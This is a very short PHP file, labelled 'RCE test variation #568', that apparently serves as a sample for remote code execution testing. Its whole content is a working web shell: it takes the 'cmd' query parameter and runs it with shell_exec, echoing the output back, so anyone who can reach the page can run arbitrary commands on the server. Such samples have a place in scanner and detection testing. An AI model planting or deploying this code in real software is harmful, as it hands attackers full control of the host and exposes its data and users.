<?php
// RCE test variation #568
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>